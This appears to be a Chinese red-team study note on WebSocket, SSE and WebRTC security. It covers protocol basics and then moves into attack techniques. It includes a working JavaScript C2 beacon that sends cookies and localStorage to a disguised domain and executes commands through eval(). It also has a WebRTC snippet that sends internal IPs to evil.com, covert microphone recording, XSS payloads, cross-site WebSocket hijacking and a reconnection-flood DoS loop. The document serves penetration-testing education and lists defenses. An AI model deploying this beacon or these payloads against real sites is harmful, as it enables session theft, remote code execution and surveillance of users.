## 目录

- [[#一、WebSocket协议基础|一、WebSocket协议基础]]
- [[#二、WebSocket API详解|二、WebSocket API详解]]
- [[#三、Server-Sent Events (SSE)|三、Server-Sent Events]]
- [[#四、WebRTC实时通信|四、WebRTC实时通信]]
- [[#五、WebSocket安全漏洞|五、WebSocket安全漏洞]]
- [[#六、WebSocket在C2中的应用|六、WebSocket在C2中的应用]]
- [[#七、实时通信攻击向量|七、实时通信攻击向量]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、WebSocket协议基础

### 什么是WebSocket

WebSocket提供**全双工**、**持久化**的HTTP连接。与HTTP的请求-响应模式不同，WebSocket建立连接后双方可以随时发送数据。

```
HTTP：  客户端 → 请求 → 服务器 → 响应 → 连接关闭
        客户端 → 请求 → 服务器 → 响应 → 连接关闭  （重复）

WS：    客户端 ↔ 握手 ↔ 服务器
        客户端 ↔ 消息 ↔ 服务器  （持久连接，双向）
```

### 握手过程

```http
# 客户端 → 服务器（HTTP Upgrade）
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

# 服务器 → 客户端（101 Switching Protocols）
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### 与HTTP对比

| 特性 | HTTP | WebSocket |
|------|------|-----------|
| 通信模式 | 请求-响应 | 全双工 |
| 连接 | 短连接/长连接 | 持久化 |
| 头部开销 | 每次请求都有 | 仅握手时有 |
| 协议 | http/https | ws/wss |
| Service Worker | 不支持 | 不支持 |
| 同源策略 | 限制 | 无限制！ |

## 二、WebSocket API详解

### 客户端

```javascript
// 建立连接
const ws = new WebSocket('wss://example.com/socket');

// 事件处理
ws.onopen = function() {
  console.log('Connected');
  ws.send(JSON.stringify({ type: 'join', room: 'general' }));
};

ws.onmessage = function(event) {
  const data = JSON.parse(event.data);
  console.log('Received:', data);
  
  // 处理不同类型消息
  switch(data.type) {
    case 'chat': displayMessage(data); break;
    case 'alert': showAlert(data); break;
    case 'command': executePayload(data); break;  // ← 攻击面！
  }
};

ws.onerror = function(error) {
  console.error('WebSocket error:', error);
};

ws.onclose = function(event) {
  console.log('Disconnected:', event.code, event.reason);
};

// 发送数据（支持文本和二进制）
ws.send('text message');
ws.send(JSON.stringify({ key: 'value' }));
ws.send(new Blob([arrayBuffer]));
ws.send(new ArrayBuffer(8));
```

### Node.js服务端

```javascript
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', function connection(ws, req) {
  const ip = req.socket.remoteAddress;
  console.log('New connection from', ip);
  
  ws.on('message', function incoming(data) {
    console.log('received:', data);
    // 广播给所有客户端
    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(data);
      }
    });
  });
  
  ws.on('close', function() {
    console.log('Client disconnected');
  });
});
```

## 三、Server-Sent Events (SSE)

### SSE vs WebSocket

| 特性 | SSE | WebSocket |
|------|-----|-----------|
| 方向 | 仅服务器→客户端 | 双向 |
| 协议 | HTTP | ws/wss |
| 自动重连 | 原生支持 | 需手动 |
| 二进制支持 | 否（仅文本） | 是 |
| EventSource API | 简单 | 复杂 |

### SSE客户端

```javascript
const eventSource = new EventSource('/api/events');

eventSource.onmessage = function(event) {
  console.log('Message:', event.data);
};

eventSource.addEventListener('alert', function(event) {
  console.log('Alert:', event.data);
  // 如果 event.data 直接插入DOM → XSS
});

eventSource.onerror = function() {
  // 自动重连是SSE的默认行为
};
```

### SSE攻击面

```javascript
// 如果SSE事件数据由攻击者控制
eventSource.onmessage = function(event) {
  resultDiv.innerHTML = event.data;  // ← DOM XSS
  // event.data = '<img src=x onerror=alert(1)>'
};
```

## 四、WebRTC实时通信

### 核心API

```javascript
// 本地媒体流
navigator.mediaDevices.getUserMedia({ video: true, audio: true })
  .then(stream => {
    videoElement.srcObject = stream;
  });

// 屏幕共享
navigator.mediaDevices.getDisplayMedia({ video: true })
  .then(stream => { /* ... */ });

// P2P数据通道
const pc = new RTCPeerConnection(config);
const dataChannel = pc.createDataChannel('chat');

dataChannel.onmessage = function(event) {
  console.log('P2P Message:', event.data);
};
```

### WebRTC安全关注

```javascript
// 1. 内网IP泄露
const pc = new RTCPeerConnection({ iceServers: [] });
pc.createDataChannel('');
pc.createOffer().then(offer => pc.setLocalDescription(offer));
pc.onicecandidate = e => {
  if (!e.candidate) return;
  const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
  if (ip) fetch('//evil.com/log?ip=' + ip[0]);
};

// 2. 强制媒体访问
navigator.mediaDevices.getUserMedia({ audio: true })
  .then(stream => {
    // 录音并通过WebSocket发送
    const recorder = new MediaRecorder(stream);
    recorder.ondataavailable = e => {
      ws.send(e.data);
    };
    recorder.start(1000);
  });
```

## 五、WebSocket安全漏洞

### 1. 无Origin验证

WebSocket不受同源策略限制！任何网站都可以建立WebSocket连接到任何服务器。

```javascript
// 攻击者在 evil.com 上可以：
const ws = new WebSocket('wss://bank.com/internal-socket');
ws.onopen = () => ws.send(JSON.stringify({ action: 'transfer', amount: 10000 }));
// 浏览器会自动携带bank.com的Cookie
// 服务器必须验证Origin！
```

### 2. Cross-Site WebSocket Hijacking (CSWSH)

```
攻击流程：
1. 受害者登录 bank.com
2. 受害者访问 evil.com
3. evil.com 的JS建立到 wss://bank.com/socket 的WebSocket
4. 浏览器自动发送bank.com的Cookie（WebSocket握手是HTTP）
5. WebSocket连接以受害者的身份建立
6. 攻击者通过WebSocket执行受害者权限内的操作
```

防御：
- 服务器验证 `Origin` 请求头
- 使用CSRF Token（WebSocket握手可以用GET参数带Token）
- 对WebSocket消息做认证（要求消息内带Token）

### 3. WebSocket消息注入

```javascript
// 如果收到的WebSocket消息直接插入DOM
ws.onmessage = function(event) {
  document.getElementById('messages').innerHTML += event.data;
  // event.data = '<img src=x onerror=alert(1)>'
  // → DOM XSS via WebSocket
};
```

### 4. DoS via WebSocket

```javascript
// 无限重连轰炸
function hammer() {
  const ws = new WebSocket('wss://target.com/socket');
  ws.onclose = () => setTimeout(hammer, 0);  // 立即重连
}
for (let i = 0; i < 1000; i++) hammer();  // 1000并发重连
```

## 六、WebSocket在C2中的应用

### 为什么选择WebSocket做C2

| 优势 | 说明 |
|------|------|
| 双向通信 | 客户端和C2服务器随时互发数据 |
| 实时性 | 无轮询延迟 |
| 伪装 | 看起来像正常的Web应用 |
| 穿越代理 | 大多数网络允许ws/wss |
| 心跳机制 | 内置ping/pong |
| 二进制传输 | 加密payload的隐蔽传输 |

### 红队C2 WebSocket模板

```javascript
// 隐写C2通信（嵌入正常Web应用）
(function() {
  const c2 = new WebSocket('wss://cdn-cdn-statistics.com/metrics');
  
  c2.onopen = function() {
    // 发送系统信息
    c2.send(JSON.stringify({
      type: 'beacon',
      host: location.host,
      userAgent: navigator.userAgent,
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage)
    }));
  };
  
  c2.onmessage = function(event) {
    const cmd = JSON.parse(event.data);
    try {
      // 执行C2下发的命令
      const result = eval(cmd.js);  // 危险：执行任意JS
      c2.send(JSON.stringify({ type: 'result', data: result }));
    } catch(e) {
      c2.send(JSON.stringify({ type: 'error', data: e.message }));
    }
  };
  
  // 心跳
  setInterval(() => {
    if (c2.readyState === WebSocket.OPEN) {
      c2.send('ping');
    }
  }, 30000);
})();
```

## 七、实时通信攻击向量

### 攻击矩阵

| 攻击 | 目标技术 | 必要条件 |
|------|---------|---------|
| CSWSH | WebSocket | Cookie认证+无Origin验证 |
| WebSocket XSS | WS消息 | 消息写入DOM |
| WebSocket DoS | WS连接 | 无频率限制 |
| 内网IP泄露 | WebRTC | 执行JS |
| 摄像头/麦克风 | WebRTC | 用户授权 |
| SSE注入 | Server-Sent Events | 事件数据可控 |
| SignalR安全 | ASP.NET SignalR | 消息处理不当 |

### WebSocket安全测试清单

```bash
# 1. 检查WebSocket端点
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
  https://target.com/socket

# 2. 测试Origin验证
# 使用Burp修改Origin头：
# Origin: https://evil.com

# 3. 测试消息注入
# Burp WebSocket选项卡 → 发送恶意JSON payload
```

## 八、红队视角总结

### 实时通信技术在渗透测试中的应用

| 阶段 | 技术 | 用途 |
|------|------|------|
| 侦察 | WebSocket探测 | 发现隐藏的内部API |
| 信息收集 | WebRTC | 泄露内网IP |
| 持久化 | WebSocket Beacon | C2通道 |
| 横向移动 | WebSocket代理 | 内网隧道 |
| 数据外泄 | WebSocket/SSE | 实时数据流外传 |
| 社会工程 | WebRTC | 强制摄像头/麦克风 |

### 工具

| 工具 | 用途 |
|------|------|
| Burp Suite WebSocket Tab | WS消息截获和修改 |
| wscat | CLI WebSocket客户端 |
| websocat | 类似netcat的WebSocket工具 |
| ws-harness.py | 自动化WS测试 |
| STUNner | WebRTC渗透工具 |

---
**返回** [[JS基础总目录|JavaScript 总目录]] | [[../前端基础总目录|前端基础总目录]]
